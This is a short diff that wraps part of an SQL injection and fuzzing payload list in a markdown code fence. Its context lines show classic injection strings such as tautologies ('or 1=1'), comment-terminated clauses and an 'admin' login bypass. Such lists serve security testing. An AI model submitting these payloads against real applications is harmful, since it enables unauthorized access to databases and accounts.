@@ -1,3 +1,4 @@
+```
 <>"'%;)(&+
 |
 !
@@ -191,7 +192,7 @@ x' AND userid IS NULL; --
 x' or 1=1 or 'x'='y
 x' OR full_name LIKE '%Bob%
 ý or 1=1 --
-
+```
 
 admin' or '1'='1
 
